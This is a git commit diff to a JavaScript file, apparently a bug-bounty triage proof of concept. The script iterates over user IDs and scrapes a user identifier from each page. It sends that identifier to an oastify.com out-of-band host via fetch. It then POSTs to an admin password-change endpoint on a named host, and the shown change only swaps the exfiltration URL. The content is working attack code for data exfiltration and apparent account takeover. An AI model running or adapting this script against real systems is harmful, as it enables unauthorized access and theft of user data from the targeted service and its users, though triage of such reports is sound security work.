182552751d9e40ac9c9fb4b8c1e74252706682cc
LVtriage <luis@inspectiv.com>
2025-08-26 15:52:19 -0500

    Update 36838.js

--- 36838.js
+++ 36838.js
@@ -4,7 +4,7 @@ for (let i = 199200; i <= 199299; i++) {
     .then(res => {
       let match = res.match(/id='UserIDText'>(.*?)<\/span>/);
       if (match) {
-        fetch(`https://a2du46mpuqca25k6relyc6fn2e85wvkk.oastify.com?data=${encodeURIComponent(match[1])}`);
+        fetch(`1mog1ow5kzp7jzj7c6udt7ayjppgd61v.oastify.com?data=${encodeURIComponent(match[1])}`);
       }
       return fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
         method: "POST",
